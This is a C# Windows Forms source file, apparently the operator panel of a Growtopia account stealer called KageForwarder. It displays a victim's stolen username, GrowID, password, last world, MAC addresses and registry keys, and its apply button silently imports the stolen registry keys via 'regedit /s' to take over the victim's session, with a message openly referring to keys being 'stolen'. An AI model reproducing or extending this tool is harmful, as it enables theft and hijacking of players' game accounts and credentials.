using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KageForwarder
{
    public partial class Growtopia : Form
    {
        public Growtopia(string user, string growid, string passwords, string lastworld, string mac, string reg)
        {
            InitializeComponent();
            userkek.Text = user;
            growids.Text = growid;
            password.Text = passwords;
            lastwrld.Text = lastworld;
            string macs = mac.Replace("@", "\n");
            maclist.Text = macs;
            richTextBox1.Text = reg;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            this.Close();

        }

        private void apply_Click(object sender, EventArgs e)
        {
            if(richTextBox1.Text == "No")
            {
                MessageBox.Show("KageForwarder", "Sorry no regedit keys was stolen!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                string directory = Path.GetTempPath() + "\\keys.reg";
                
                if(!File.Exists(directory))
                {
                    File.WriteAllText(directory, richTextBox1.Text);
                    Process regeditProcess = Process.Start("regedit.exe", "/s \"" + directory + "\"");
                    regeditProcess.WaitForExit();
                    File.Delete(directory);
                }              
            }
        }
    }
}
